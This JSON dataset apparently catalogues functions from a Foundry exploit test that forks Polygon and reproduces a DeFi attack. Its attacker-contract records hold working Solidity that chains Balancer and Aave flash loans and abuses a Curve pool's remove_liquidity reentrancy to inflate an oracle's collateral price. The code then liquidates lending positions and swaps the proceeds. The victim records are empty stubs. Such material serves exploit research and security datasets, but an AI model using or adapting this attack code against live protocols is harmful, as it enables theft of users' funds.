[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        if (msg.sender == address(aaveV3)) {\n            WMATIC.approve(address(aaveV3), type(uint256).max);\n            aaveV2Flashloan();\n            return true;\n        } else {\n            WMATIC.approve(address(aaveV2), type(uint256).max);\n            address[] memory cTokens = new address[](5);\n            cTokens[0] = address(WMATIC_STMATIC);\n            cTokens[1] = address(FJCHF);\n            cTokens[2] = address(FJEUR);\n            cTokens[3] = address(FJGBP);\n            cTokens[4] = address(FAGEUR);\n            unitroller.enterMarkets(cTokens);\n            WMATIC.approve(address(curvePool), type(uint256).max);\n            STMATCI_F.approve(address(WMATIC_STMATIC), type(uint256).max);\n            curvePool.add_liquidity([uint256(0), uint256(270_000 * 1e18)], 0);\n            uint256 mintAmount = STMATCI_F.balanceOf(address(this));\n            WMATIC_STMATIC.mint(mintAmount); // deposit collateral\n            uint256 WMMATICAmount = WMATIC.balanceOf(address(this));\n            console.log(\n                \"Before reentrancy collateral price\", oraclePrice.getUnderlyingPrice(address(WMATIC_STMATIC)) / 1e18\n            );\n            uint256 LPAmount = curvePool.add_liquidity([uint256(0), WMMATICAmount], 0);\n            curvePool.remove_liquidity(LPAmount, [uint256(0), uint256(0)], true); // reentrancy point\n            liquidate();\n            curvePool.remove_liquidity_one_coin(STMATCI_F.balanceOf(address(this)), 1, 0, false);\n            swapAll();\n            return true;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        aaveV3Flashloan();\n        WMATIC.transfer(address(balancer), balancerFlashloanAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"https://polygon.llamarpc.com\", 38_118_347);\n        cheats.label(address(balancer), \"balancer\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(aaveV2), \"aaveV2\");\n        cheats.label(address(unitroller), \"unitroller\");\n        cheats.label(address(curvePool), \"curvePool\");\n        cheats.label(address(EURCurvePool), \"EURCurvePool\");\n        cheats.label(address(oraclePrice), \"oraclePrice\");\n        cheats.label(address(WMATIC_STMATIC), \"WMATIC_STMATIC\");\n        cheats.label(address(KyberRouter), \"KyberRouter\");\n        cheats.label(address(UniRouter), \"UniRouter\");\n        cheats.label(address(oraclePrice), \"oraclePrice\");\n        cheats.label(address(FJCHF), \"FJCHF\");\n        cheats.label(address(FJEUR), \"FJEUR\");\n        cheats.label(address(FJGBP), \"FJGBP\");\n        cheats.label(address(FAGEUR), \"FAGEUR\");\n        cheats.label(address(WMATIC), \"WMATIC\");\n        cheats.label(address(STMATCI_F), \"STMATCI_F\");\n        cheats.label(address(STMATCI), \"STMATCI\");\n        cheats.label(address(USDC), \"USDC\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        balancerFlashloan();\n\n        emit log_named_decimal_uint(\n            \"Attacker WMATIC balance after exploit\", WMATIC.balanceOf(address(this)), WMATIC.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "A",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "add_liquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "admin_fee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "balances",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "calc_token_amount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "coins",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "exchange",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "exchange_underlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "fee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "future_A",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "future_admin_fee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "future_fee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "get_dy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "get_dy_underlying",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "get_virtual_price",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity_imbalance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "remove_liquidity_one_coin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICurvePools",
    "source_type": "victim_contract",
    "function_name": "underlying_coins",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LiquidateContract",
    "source_type": "victim_contract",
    "function_name": "liquidate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PriceProvider",
    "source_type": "victim_contract",
    "function_name": "getUnderlyingPrice",
    "original_code": "",
    "description": ""
  }
]